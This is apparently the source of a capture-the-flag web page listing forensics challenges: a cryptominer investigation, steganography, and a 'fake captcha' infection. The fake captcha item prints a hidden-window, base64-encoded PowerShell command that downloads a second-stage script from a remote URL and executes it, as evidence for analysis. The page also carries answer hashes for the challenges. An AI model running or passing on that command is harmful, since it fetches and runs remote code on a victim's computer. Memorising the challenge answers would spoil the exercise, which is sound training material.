import { Text, Code, Stack, Image } from "@mantine/core";
import Challenge from "../Components/Challenge";

function C02() {

  return (
    <Stack p={20} gap={10}>
      <Challenge title="01/a Mine and Cra(ck)ft" content={<><Text>This challenge is multipart, consisting of five parts (a-e)</Text><Text>We recieved alerts of one of our IoT systems overheating. After initial investigation, it was revealed, that the CPU usage at the time was unexpectedly high. You have been provided with the machine's filesystem, see what you can find.</Text><Text>Enter the hostname of the machine</Text></>} solutionHash="3bf7bd3a4c57518cb4d1622284d6b4b6769b6a1c3b5973ae770226f7b5ba839b" flagFormat={{regex: /[A-Za-z0-9]{1,20}/, message: "Flag is the hostname which matches the following: "}} files={[{name: "01 filesystem.tar.gz", path: "02/01filesystem.tar.gz"}]} />
      <Challenge title="01/b Mine and Cra(ck)ft" content={<><Text>Enter the name of the linux distribution along with version number</Text><Text>Enter the name, followed by its full version number like this: </Text><Code><div style={{wordWrap: 'break-word'}}>Linux Distro 2.3.4</div></Code></>} solutionHash="e4612ffd0ed4ed10530a4b27e5766c8de45d74ae8a1491e08a2ac6c23ffb7adc" flagFormat={{regex: /[A-Za-z]+ [A-Za-z]+ \d\.\d\.\d/}} />
      <Challenge title="01/c Mine and Cra(ck)ft" content={<><Text>Enter name of the user behind all this</Text></>} solutionHash="8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918" flagFormat={{regex: /[A-Za-z0-9_]+/, message: "Submit the username matching: "}} />
      <Challenge title="01/d Mine and Cra(ck)ft" content={<><Text>Enter domain name of the web server used to download the payload</Text></>} solutionHash="7c73953603b02366d9fb28e99a522abb03b1b0184b7eb16e5c53a4e192fa1127" flagFormat={{regex: /[A-Za-z0-9]+\.[A-Za-z0-9]+\.[A-Za-z0-9]+/}} />
      <Challenge title="01/e Mine and Cra(ck)ft" content={<><Text>Enter the name of the problematic program</Text></>} solutionHash="55e7cdf97865ed287efc6f7bc66475f27c60bf3404285c80688f25e85de8ed08" flagFormat={{regex: /[A-Za-z0-9_]+/}} />
      <Challenge title="02 Image here image there image everywhere" content={<><Text>We have found that an employee has been exfiltrating our flag over the past few months. However, all she sent was some pictures? Can you uncover the wonders and secrets of stego?</Text></>} solutionHash="290fb30fb6e5c3504a04fb84d7b79fd068469ced8a362abc9bd86f44c289123b" flagFormat={{regex: /flag\{[A-Za-z0-9_]*\}/}} hints={["aperisolve", "Rule #1: Always inspect every file you get in notepad"]} files={[{name: "02 Everything everything, all red.png", path: "02/02 Everything everything, all red.png"}, {name: "02 It's litteraly ONE INCH.jpg", path: "02/02 It's litteraly ONE INCH.jpg"}, {name: "02 Modern art 1.png", path: "02/02 Modern art 1.png"}, {name: "02 Modern art 2.png", path: "02/02 Modern art 2.png"}]} />
      <Challenge title="03/a Fake captcha" content={<><Text>This challenge is multipart, consisting of four parts (a-d)</Text><Text>One of our workstations has been hacked! And we don't even know how the malware got there! The only whing an employee has done on the PC was to pass an anti-bot captcha! How could a captcha be malicious?</Text><Text>The following is the image of the captcha, that our EDR managed to randomly scoop.</Text><Image src="02/captcha.png" /><Text>And our awesome forensics team was able to identify the string that was stored in the user's clipboard: </Text><Code><div style={{wordWrap: 'break-word'}}>cmd /c "powershell.exe -w h -e JHVybCA9ICJodHRwczovL3hhbnR1czEwLmdpdGh1Yi5pby9DVEYvMDIvc2Vjb25kcGhhc2UucHMxIg0KJHJlcyA9IEludm9rZS1XZWJSZXF1ZXN0ICR1cmwNCiRjID0gJHJlcy5Db250ZW50DQpJbnZva2UtRXhwcmVzc2lvbiAkYw=="</div></Code><Text>What is the name of the first malicious file, whose content is downloaded onto the user's computer (include the extension)?</Text></>} solutionHash="1f360d0037f197641e7ade588070d88eb3b59c023bf746c6f1c633eec090a760" flagFormat={{regex: /[A-Za-z0-9_]+\.[A-Za-z0-9]{1,5}/}} hints={["What does powershell option -e do?"]} />
      <Challenge title="03/b Fake captcha" content={<><Text>What is the full path to the second phase of the malware (path + filename + extension)?</Text></>} solutionHash="612da70d01cb8a51d1c8a5e705dc9f98d46c61354a0de0553cf8d0dd6d7f61cb" flagFormat={{regex: /C:\\[A-Za-z0-9_/]+\.[A-Za-z0-9]{1,5}/}} hints={["As long as you know what you're executing, prehaps some lines from the script are safe to run"]} />
      <Challenge title="03/c Fake captcha" content={<><Text>What is the name of the registry key that is set under</Text><Code><div style={{wordWrap: 'break-word'}}>CurrentVersion\Run</div></Code></>} solutionHash="ea10dbbc80765c63e3267370fcef8f873bcb892df21478cd19956bead672584e" flagFormat={{regex: /[A-Za-z0-9]+/}} />
      <Challenge title="03/d Fake captcha" content={<><Text>The second phase of the malware does some action every X minutes.</Text></>} solutionHash="4523540f1504cd17100c4835e85b7eefd49911580f8efff0599a8f283be6b9e3" flagFormat={{regex: /\d{1,3}/, message: "The flag is the number of minutes: "}} hints={["What language is the second phase programmed in?", "Can be easily decompiled with the right tool"]} />
      </Stack>
  );
}

export default C02;